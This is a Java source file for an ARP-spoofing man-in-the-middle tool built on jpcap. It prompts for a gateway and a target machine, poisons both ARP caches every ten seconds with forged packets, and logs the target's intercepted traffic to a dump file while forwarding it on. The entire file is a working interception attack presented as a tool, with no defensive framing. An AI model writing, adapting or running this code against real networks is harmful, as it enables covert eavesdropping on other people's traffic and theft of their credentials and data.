import java.io.*;
import java.util.Arrays;

import jpcap.*;
import jpcap.packet.IPPacket;
import jpcap.packet.Packet;
 
public class MiM extends Thread {
	private static Device myNic;
	private static Host gateway;
	private static Host targetPC;
	private static JpcapWriter writer;
    
	// This class does the packet logging/forwarding
    public static class packetLogger implements PacketReceiver {
    	public void receivePacket(Packet packet) {
    		IPPacket p = (IPPacket) packet;
    		byte[] packetSourceIP = p.src_ip.getAddress();
    		byte[] packetDestinationIP = p.dst_ip.getAddress();
    		// Look for packets with the target PC's source IP
   			if(Arrays.equals(packetSourceIP, targetPC.getIpAddr())) {
   				writer.writePacket(packet);
   				PacketCrafter.forwardPacket(myNic.getDeviceCaptor(), packet, myNic, gateway);
   			}
   		// Look for packets with the gateway's source IP destined for the target PC
   			else if(Arrays.equals(packetSourceIP, gateway.getIpAddr())) {
   				if(Arrays.equals(packetDestinationIP, targetPC.getIpAddr())) {
   					writer.writePacket(packet);
   					PacketCrafter.forwardPacket(myNic.getDeviceCaptor(), packet, myNic, gateway);
   				}
   			}
    	}
    }
    
    public static void main(String[] args) {
    	// Captures any shutdown events and cleans ARP caches of gateway and target PC
    	Runtime.getRuntime().addShutdownHook(new Thread() {
    	    public void run() {
    	    	System.out.println("Putting ARP Caches back to normal.");
    	    	cleanARPCaches();
    	    }
    	});
    	
    	final int TEN_SECONDS = 10000;
    	
    	// Get the IP and MAC addr of this machine
    	myNic = new Device();
    	myNic.selectNicAndRetrieveIpAndMacAddr();
    	myNic.setCaptorFilter("arp");
    	
    	// Get the IP and MAC addr of the gateway
    	gateway = new Host();
    	System.out.print("Gateway IP: ");
    	gateway.promptForIpAddr();
    	gateway.retrieveMacAddr(myNic.getDeviceCaptor(), myNic.getIpAddr(), myNic.getMacAddr());
    	    	    	
    	// Get the IP and MAC addr of the target PC machine
    	targetPC = new Host();
    	System.out.print("Target PC IP: ");
    	targetPC.promptForIpAddr();
    	targetPC.retrieveMacAddr(myNic.getDeviceCaptor(), gateway.getIpAddr(), myNic.getMacAddr());
    	
    	myNic.setCaptorFilter("");
    	spoofARPToPcAndGateway();
    	
    	try {
    	   	writer = JpcapWriter.openDumpFile(myNic.getDeviceCaptor(), "DataLog.txt");
    	}
    	catch(IOException e) {
    		System.out.println(e.getMessage());
    		System.exit(1);
    	}
    	
    	MiM logger = new MiM();
    	logger.start();
    	
    	while(true) {
    		try {
    			Thread.sleep(TEN_SECONDS);
    		}
    		catch(InterruptedException e) {
    			System.out.println(e.getMessage());
    			System.exit(1);
    		}
    		
    		System.out.println("*** Spoofing ARP Packet...");
    		spoofARPToPcAndGateway();
    	}
    	  	
    }
    
    public void run() {
    	(myNic.getDeviceCaptor()).loopPacket(-1, new packetLogger());
    }
        
    public static void spoofARPToPcAndGateway() {
    	PacketCrafter.craftARPPacket(myNic.getDeviceCaptor(), gateway.getIpAddr(), myNic.getMacAddr(), targetPC.getIpAddr(), targetPC.getMacAddr());
    	PacketCrafter.craftARPPacket(myNic.getDeviceCaptor(), targetPC.getIpAddr(), myNic.getMacAddr(), gateway.getIpAddr(), gateway.getMacAddr());    	
    }
    
    public static void cleanARPCaches() {
    	PacketCrafter.craftARPPacket(myNic.getDeviceCaptor(), targetPC.getIpAddr(), targetPC.getMacAddr(), gateway.getIpAddr(), gateway.getMacAddr());
    	PacketCrafter.craftARPPacket(myNic.getDeviceCaptor(), gateway.getIpAddr(), gateway.getMacAddr(), targetPC.getIpAddr(), targetPC.getMacAddr());
    }
    
}
